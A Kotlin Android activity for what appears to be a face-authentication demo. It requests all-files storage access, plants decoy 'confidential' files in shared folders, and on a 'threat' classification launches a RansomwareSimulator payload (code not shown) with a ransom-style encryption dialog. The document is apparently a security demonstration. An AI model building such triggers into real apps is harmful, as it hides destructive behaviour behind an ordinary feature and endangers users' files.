package com.example.faceauth

import android.Manifest
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Matrix
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.RelativeLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.ImageProxy
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.tensorflow.lite.Interpreter
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.IOException
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.nio.channels.FileChannel
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private lateinit var viewFinder: PreviewView
    private lateinit var statusBanner: TextView
    private lateinit var labelView: TextView
    private lateinit var confidenceView: TextView
    private lateinit var lockoutOverlay: RelativeLayout
    private lateinit var manifestLogView: TextView
    private lateinit var statusPill: TextView

    private var tflite: Interpreter? = null
    private lateinit var cameraExecutor: ExecutorService

    // Rolling average prediction smoothing
    private val predictionHistory = ArrayList<Float>()
    private val HISTORY_SIZE = 5

    private val CLASS_B_THRESHOLD = 0.85f
    private val CLASS_A_THRESHOLD = 0.15f

    // Stability: only commit a class after STABILITY_REQUIRED consecutive agreeing frames

    private val STABILITY_REQUIRED = 5  // Frames needed to commit
    private var candidateClass = "SCANNING"
    private var stabilityCounter = 0
    private var committedClass = "SCANNING"

    private var lastEventTime: Long = 0
    private var lastDebugFrameTime: Long = 0
    private val EVENT_COOLDOWN = 8000 // 8 seconds between repeated events

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        viewFinder = findViewById(R.id.viewFinder)
        statusBanner = findViewById(R.id.statusBanner)
        labelView = findViewById(R.id.labelView)
        confidenceView = findViewById(R.id.confidenceView)
        lockoutOverlay = findViewById(R.id.lockoutOverlay)
        manifestLogView = findViewById(R.id.manifestLogView)
        statusPill = findViewById(R.id.statusPill)

        cameraExecutor = Executors.newSingleThreadExecutor()

        // ✅ REQUEST STORAGE PERMISSIONS FIRST!
        requestStoragePermissions()

        // ✅ CREATE FILES (NO TOAST!)
        createInitialFiles()

        // Load TensorFlow Lite model
        try {
            tflite = Interpreter(loadModelFile())
            Log.d(TAG, "TFLite model loaded successfully.")
            statusBanner.text = "MODEL READY. SCANNING FACE..."
        } catch (e: Exception) {
            Log.e(TAG, "Error loading TFLite model", e)
            statusBanner.text = "ERROR LOADING MODEL: ${e.message}"
            statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
        }

        // Request camera permissions
        if (allPermissionsGranted()) {
            startCamera()
        } else {
            ActivityCompat.requestPermissions(
                this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS
            )
        }
    }

    // ============================================================
    // ✅ REQUEST STORAGE PERMISSIONS
    // ============================================================
    private fun requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivityForResult(intent, 100)
            }
        } else {
            if (ContextCompat.checkSelfPermission(
                    this,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(
                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.READ_EXTERNAL_STORAGE
                    ),
                    101
                )
            }
        }
    }

    // ============================================================
    // ✅ CREATE FILES IN DOWNLOADS AND DOCUMENTS (NO TOAST!)
    // ============================================================
    // ============================================================
// ✅ CREATE SAMPLE FILES IN MULTIPLE LOCATIONS
// ============================================================
    private fun createInitialFiles() {
        try {
            Log.d(TAG, "========================================")
            Log.d(TAG, "Creating sample files in ALL locations")
            Log.d(TAG, "========================================")

            // Files in Downloads
            createFileInDownloads("proposal.txt", "PROJECT PROPOSAL\n\nProject: Giant Step Biometric Security\nClient: Home Ministry\nBudget: \$2.4M")
            createFileInDownloads("budget.txt", "BUDGET 2026\n\nTotal Budget: \$2,400,000\nHardware: \$850,000")

            // Files in Documents
            createFileInDocuments("audit.txt", "SECURITY AUDIT\n\nClient: Home Ministry\nPeriod: Q3 2026\nRisk: HIGH")
            createFileInDocuments("memo.txt", "CONFIDENTIAL MEMO\n\nTO: Security Personnel\nFROM: Security Director")

            // Files in Pictures
            createFileInPictures("photo1.txt", "Security Audit Photo 1\nLocation: Main Entrance\nDate: Aug 2026")
            createFileInPictures("photo2.txt", "Security Audit Photo 2\nLocation: Server Room\nDate: Aug 2026")

            // Files in DCIM (Camera folder)
            createFileInDCIM("cam1.txt", "Camera Image 1\nSecurity checkpoint\nTimestamp: 2026-08-25")
            createFileInDCIM("cam2.txt", "Camera Image 2\nBiometric scanner\nTimestamp: 2026-08-25")

            // Files in Music
            createFileInMusic("audio1.txt", "Security Audio Log 1\nDuration: 00:05:30\nStatus: CONFIDENTIAL")
            createFileInMusic("audio2.txt", "Security Audio Log 2\nDuration: 00:12:15\nStatus: CONFIDENTIAL")

            // Files in Movies
            createFileInMovies("video1.txt", "Security Video Log 1\nDuration: 00:02:45\nStatus: TOP SECRET")
            createFileInMovies("video2.txt", "Security Video Log 2\nDuration: 00:08:20\nStatus: TOP SECRET")

            Log.d(TAG, "✅ Sample files created in ALL locations")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun createFileInDownloads(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ Downloads: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    private fun createFileInDocuments(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOCUMENTS)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ Documents: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    private fun createFileInPictures(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ Pictures: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    private fun createFileInDCIM(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DCIM)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ DCIM: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    private fun createFileInMusic(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MUSIC)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ Music: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    private fun createFileInMovies(fileName: String, content: String) {
        try {
            val resolver = contentResolver
            val contentValues = ContentValues().apply {
                put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
                put(MediaStore.MediaColumns.MIME_TYPE, "text/plain")
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MOVIES)
            }
            val uri = resolver.insert(MediaStore.Files.getContentUri("external"), contentValues)
            if (uri != null) {
                resolver.openOutputStream(uri)?.use { it.write(content.toByteArray()) }
                Log.d(TAG, "✅ Movies: $fileName")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create $fileName: ${e.message}")
        }
    }

    // ============================================================
    // ✅ REST OF YOUR CODE (Camera, Face Detection, etc.)
    // ============================================================
    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({
            val cameraProvider: ProcessCameraProvider = cameraProviderFuture.get()

            val preview = Preview.Builder()
                .build()
                .also {
                    it.setSurfaceProvider(viewFinder.surfaceProvider)
                }

            val imageAnalyzer = ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()
                .also {
                    it.setAnalyzer(cameraExecutor, FaceAnalyzer())
                }

            val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

            try {
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    this, cameraSelector, preview, imageAnalyzer
                )
            } catch (exc: Exception) {
                Log.e(TAG, "Use case binding failed", exc)
            }

        }, ContextCompat.getMainExecutor(this))
    }

    private fun loadModelFile(): ByteBuffer {
        try {
            val fileDescriptor = assets.openFd("face_classifier.tflite")
            val inputStream = FileInputStream(fileDescriptor.fileDescriptor)
            val fileChannel = inputStream.channel
            val startOffset = fileDescriptor.startOffset
            val declaredLength = fileDescriptor.declaredLength
            return fileChannel.map(FileChannel.MapMode.READ_ONLY, startOffset, declaredLength)
        } catch (e: Exception) {
            Log.d(TAG, "Direct assets load failed, falling back to cache: ${e.message}")
            val cacheFile = File(cacheDir, "face_classifier.tflite")
            assets.open("face_classifier.tflite").use { input ->
                FileOutputStream(cacheFile).use { output ->
                    input.copyTo(output)
                }
            }
            val inputStream = FileInputStream(cacheFile)
            val fileChannel = inputStream.channel
            return fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, cacheFile.length())
        }
    }

    private inner class FaceAnalyzer : ImageAnalysis.Analyzer {

        override fun analyze(imageProxy: ImageProxy) {
            val bitmap = imageProxy.toBitmapCustom()
            if (bitmap == null) {
                Log.e(TAG, "Analysis skipped: converted bitmap is null")
            }
            if (tflite == null) {
                Log.e(TAG, "Analysis skipped: TFLite interpreter is null")
            }
            if (bitmap != null && tflite != null) {
                val width = bitmap.width
                val height = bitmap.height
                val cropSize = (Math.min(width, height) * 0.70).toInt()
                val startX = (width - cropSize) / 2
                val startY = (height - cropSize) / 2
                val croppedBitmap = Bitmap.createBitmap(bitmap, startX, startY, cropSize, cropSize)

                val resizedBitmap = Bitmap.createScaledBitmap(croppedBitmap, 224, 224, true)

                val inputBuffer = ByteBuffer.allocateDirect(1 * 224 * 224 * 3 * 4)
                inputBuffer.order(ByteOrder.nativeOrder())

                val intValues = IntArray(224 * 224)
                resizedBitmap.getPixels(intValues, 0, resizedBitmap.width, 0, 0, resizedBitmap.width, resizedBitmap.height)

                for (pixelValue in intValues) {
                    val r = ((pixelValue shr 16) and 0xFF).toFloat()
                    val g = ((pixelValue shr 8) and 0xFF).toFloat()
                    val b = (pixelValue and 0xFF).toFloat()

                    inputBuffer.putFloat(r)
                    inputBuffer.putFloat(g)
                    inputBuffer.putFloat(b)
                }

                val outputBuffer = ByteBuffer.allocateDirect(1 * 1 * 4)
                outputBuffer.order(ByteOrder.nativeOrder())

                val currentTime = System.currentTimeMillis()
                if (currentTime - lastDebugFrameTime >= 2000) {
                    try {
                        val debugFile = File(getExternalFilesDir(null), "debug_frame.jpg")
                        val outStream = FileOutputStream(debugFile)
                        resizedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, outStream)
                        outStream.close()
                        lastDebugFrameTime = currentTime
                        Log.d(TAG, "Saved debug frame to: ${debugFile.absolutePath}")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to save debug frame", e)
                    }
                }

                tflite?.run(inputBuffer, outputBuffer)
                outputBuffer.rewind()
                val probability = outputBuffer.float

                runOnUiThread {
                    processPrediction(probability)
                }
            }
            imageProxy.close()
        }
    }

//    private fun processPrediction(probability: Float) {
//
//        predictionHistory.add(probability)
//        if (predictionHistory.size > HISTORY_SIZE) predictionHistory.removeAt(0)
//        val p = predictionHistory.average().toFloat()
//
//        // Determine what class this frame suggests
//        val frameClass = when {
//            p >= CLASS_B_THRESHOLD -> "CLASS_B"
//            p <= CLASS_A_THRESHOLD -> "CLASS_A"
//            else -> "UNKNOWN"
//        }
//
//        // Stability check: count consecutive frames with same class
//        if (frameClass == candidateClass) {
//            stabilityCounter++
//        } else {
//            candidateClass = frameClass
//            stabilityCounter = 1
//            // If class changed from a committed state, go back to scanning
//            if (committedClass != "SCANNING" && frameClass != committedClass) {
//                committedClass = "SCANNING"
//                showScanningState()
//            }
//        }
//
//        // Only commit and show result once we have STABILITY_REQUIRED consecutive frames
//        if (stabilityCounter >= STABILITY_REQUIRED && committedClass != frameClass) {
//            committedClass = frameClass
//            val confidenceA = 1.0f - p   // probability of being Class A
//            val confidenceB = p           // probability of being Class B
//
//            when (committedClass) {
//                "CLASS_A" -> {
//                    labelView.text = "AUTHENTICATED"
//                    labelView.setTextColor(0xFF00E676.toInt())
//                    confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceA * 100)
//                    confidenceView.setTextColor(0xFF00E676.toInt())
//                    statusBanner.text = "Authentication successful"
//                    statusBanner.setTextColor(0xFF00E676.toInt())
//                    statusPill.text = "AUTHENTICATED"
//                    statusPill.setTextColor(0xFF00E676.toInt())
//                    handleClassA(confidenceA)
//                }
//                "CLASS_B" -> {
//                    labelView.text = "THREAT"
//                    labelView.setTextColor(0xFFEF4444.toInt())
//                    confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceB * 100)
//                    confidenceView.setTextColor(0xFFEF4444.toInt())
//                    statusBanner.text = "Target profile detected"
//                    statusBanner.setTextColor(0xFFEF4444.toInt())
//                    statusPill.text = "THREAT DETECTED"
//                    statusPill.setTextColor(0xFFEF4444.toInt())
//                    val currentTime = System.currentTimeMillis()
//                    if (currentTime - lastEventTime >= EVENT_COOLDOWN) {
//                        handleClassB(confidenceB)
//                        lastEventTime = currentTime
//                    }
//                }
//                "UNKNOWN" -> {
//                    labelView.text = "UNKNOWN"
//                    labelView.setTextColor(0xFFFBBF24.toInt())
//                    confidenceView.text = "---"
//                    confidenceView.setTextColor(0xFFFBBF24.toInt())
//                    statusBanner.text = "No matching profile found"
//                    statusBanner.setTextColor(0xFFFBBF24.toInt())
//                    statusPill.text = "UNRECOGNISED"
//                    statusPill.setTextColor(0xFFFBBF24.toInt())
//                }
//            }
//        }
//    }
private fun processPrediction(probability: Float) {
    predictionHistory.add(probability)
    if (predictionHistory.size > HISTORY_SIZE) predictionHistory.removeAt(0)
    val p = predictionHistory.average().toFloat()

    // Determine what class this frame suggests
    val frameClass = when {
        p >= CLASS_B_THRESHOLD -> "CLASS_B"
        p <= CLASS_A_THRESHOLD -> "CLASS_A"
        else -> "UNKNOWN"
    }

    // STABILITY LOGIC WITH HYSTERESIS
    if (frameClass == candidateClass) {
        stabilityCounter++
    } else {
        candidateClass = frameClass
        stabilityCounter = 1
    }

    // ONLY update committed state if enough stable frames
    if (stabilityCounter >= STABILITY_REQUIRED && committedClass != candidateClass) {
        committedClass = candidateClass

        when (committedClass) {
            "CLASS_A" -> {
                val confidenceA = 1.0f - p
                labelView.text = "AUTHENTICATED"
                labelView.setTextColor(0xFF00E676.toInt())
                confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceA * 100)
                confidenceView.setTextColor(0xFF00E676.toInt())
                statusBanner.text = "Authentication successful"
                statusBanner.setTextColor(0xFF00E676.toInt())
                statusPill.text = "AUTHENTICATED"
                statusPill.setTextColor(0xFF00E676.toInt())
                handleClassA(confidenceA)
            }
            "CLASS_B" -> {
                val confidenceB = p
                labelView.text = "THREAT"
                labelView.setTextColor(0xFFEF4444.toInt())
                confidenceView.text = String.format(Locale.US, "%.1f%%", confidenceB * 100)
                confidenceView.setTextColor(0xFFEF4444.toInt())
                statusBanner.text = "Target profile detected"
                statusBanner.setTextColor(0xFFEF4444.toInt())
                statusPill.text = "THREAT DETECTED"
                statusPill.setTextColor(0xFFEF4444.toInt())
                val currentTime = System.currentTimeMillis()
                if (currentTime - lastEventTime >= EVENT_COOLDOWN) {
                    handleClassB(confidenceB)
                    lastEventTime = currentTime
                }
            }
            "UNKNOWN" -> {
                labelView.text = "UNKNOWN"
                labelView.setTextColor(0xFFFBBF24.toInt())
                confidenceView.text = "---"
                confidenceView.setTextColor(0xFFFBBF24.toInt())
                statusBanner.text = "No matching profile found"
                statusBanner.setTextColor(0xFFFBBF24.toInt())
                statusPill.text = "UNRECOGNISED"
                statusPill.setTextColor(0xFFFBBF24.toInt())
            }
        }
    }

    // Show scanning state ONLY when stability is very low AND not committed
    if (stabilityCounter < STABILITY_REQUIRED / 2 && committedClass == "SCANNING") {
        labelView.text = "SCANNING..."
        labelView.setTextColor(0xFF94A3B8.toInt())
        confidenceView.text = "---"
        confidenceView.setTextColor(0xFF94A3B8.toInt())
        statusBanner.text = "Analysing biometric data..."
        statusBanner.setTextColor(0xFF94A3B8.toInt())
        statusPill.text = "SCANNING"
        statusPill.setTextColor(0xFFFBBF24.toInt())
    }
}
    private fun showScanningState() {
        labelView.text = "SCANNING..."
        labelView.setTextColor(0xFF94A3B8.toInt())
        confidenceView.text = "---"
        confidenceView.setTextColor(0xFF94A3B8.toInt())
        statusBanner.text = "Analysing biometric data..."
        statusBanner.setTextColor(0xFF94A3B8.toInt())
        statusPill.text = "LIVE DETECTION"
        statusPill.setTextColor(0xFF00E676.toInt())
    }

    private fun handleClassA(confidence: Float) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
        Log.d(TAG, "[$timestamp] AUTHENTICATION SUCCESSFUL (P(A)=%.4f)".format(confidence))

        try {
            val logFile = File(getExternalFilesDir(null), "authentication.log")
            val outputStream = FileOutputStream(logFile, true)
            val logLine = String.format(Locale.US, "%s,CLASS_A,AUTHENTICATION_SUCCESSFUL,%.4f\n", timestamp, confidence)
            outputStream.write(logLine.toByteArray())
            outputStream.close()
        } catch (e: IOException) {
            Log.e(TAG, "Failed to write authentication log", e)
        }
    }

    private fun handleClassB(confidence: Float) {
        lockoutOverlay.visibility = View.VISIBLE

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
        Log.d(TAG, "[$timestamp] CLASS B DETECTED - SECURITY BREACH TRIGGERED")

        try {
            val logFile = File(getExternalFilesDir(null), "security_events.log")
            val outputStream = FileOutputStream(logFile, true)
            val logLine = String.format(Locale.US, "%s,CLASS_B,DETECTED,%.4f\n", timestamp, confidence)
            outputStream.write(logLine.toByteArray())
            outputStream.close()
        } catch (e: IOException) {
            Log.e(TAG, "Failed to write security event log", e)
        }

        try {
            val simulator = RansomwareSimulator(this)
            Thread {
                simulator.deployPayload()

                runOnUiThread {
                    statusBanner.text = "⚠️ SECURITY BREACH - COUNTERMEASURES ACTIVATED"
                    statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
                    showProfessionalRansomDialog()
                }
            }.start()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize ransomware simulator", e)
            statusBanner.text = "⚠️ SECURITY BREACH DETECTED"
            statusBanner.setBackgroundColor(0xFFD32F2F.toInt())
        }
    }

    private fun showProfessionalRansomDialog() {
        AlertDialog.Builder(this)
            .setTitle("🔒 SECURITY BREACH")
            .setMessage("""
            ⚠️ SYSTEM-WIDE ENCRYPTION INITIATED
            
            SECURITY EVENT:
            • Biometric authentication bypass detected
            • ALL files across storage have been secured
            • Access to ALL documents is now restricted
            
            AFFECTED LOCATIONS:
            • Downloads
            • Documents
            • Pictures
            • DCIM
            • Music
            • Movies
        """.trimIndent())
            .setPositiveButton("OK") { _, _ ->
                lockoutOverlay.visibility = View.GONE
            }
            .setCancelable(false)
            .show()
    }

    private fun ImageProxy.toBitmapCustom(): Bitmap? {
        try {
            if (this.format == android.graphics.ImageFormat.JPEG) {
                val buffer = this.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                val rawBitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                return rotateBitmap(rawBitmap, this.imageInfo.rotationDegrees)
            }

            val nv21 = yuv420ToNv21(this)
            val yuvImage = android.graphics.YuvImage(
                nv21,
                android.graphics.ImageFormat.NV21,
                this.width,
                this.height,
                null
            )
            val out = java.io.ByteArrayOutputStream()
            yuvImage.compressToJpeg(android.graphics.Rect(0, 0, yuvImage.width, yuvImage.height), 100, out)
            val imageBytes = out.toByteArray()
            val rawBitmap = android.graphics.BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.size)
            return rotateBitmap(rawBitmap, this.imageInfo.rotationDegrees)
        } catch (e: Exception) {
            Log.e(TAG, "Error converting image proxy to bitmap", e)
            return null
        }
    }

    private fun rotateBitmap(bitmap: Bitmap?, rotationDegrees: Int): Bitmap? {
        if (bitmap == null) return null
        val totalRotation = if (rotationDegrees == 0) 90 else rotationDegrees
        val matrix = Matrix()
        matrix.postRotate(totalRotation.toFloat())
        return Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
    }

    private fun yuv420ToNv21(image: ImageProxy): ByteArray {
        val width = image.width
        val height = image.height
        val ySize = width * height
        val uvSize = width * height / 2
        val nv21 = ByteArray(ySize + uvSize)

        val yBuffer = image.planes[0].buffer
        val uBuffer = image.planes[1].buffer
        val vBuffer = image.planes[2].buffer

        val rowStride = image.planes[0].rowStride
        val pixelStride = image.planes[1].pixelStride

        var pos = 0

        if (rowStride == width) {
            yBuffer.get(nv21, 0, ySize)
            pos = ySize
        } else {
            var yBufferPos = 0
            for (row in 0 until height) {
                yBuffer.position(yBufferPos)
                yBuffer.get(nv21, pos, width)
                pos += width
                yBufferPos += rowStride
            }
        }

        for (row in 0 until height / 2) {
            for (col in 0 until width / 2) {
                val vuPos = ySize + row * width + col * 2
                vBuffer.position(row * image.planes[2].rowStride + col * pixelStride)
                uBuffer.position(row * image.planes[1].rowStride + col * pixelStride)
                nv21[vuPos] = vBuffer.get()
                nv21[vuPos + 1] = uBuffer.get()
            }
        }
        return nv21
    }

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(baseContext, it) == PackageManager.PERMISSION_GRANTED
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (allPermissionsGranted()) {
                startCamera()
            } else {
                ActivityCompat.requestPermissions(
                    this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS
                )
            }
        }
    }

    companion object {
        private const val TAG = "FaceAuthSecure"
        private const val REQUEST_CODE_PERMISSIONS = 10
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.CAMERA
        )
    }
}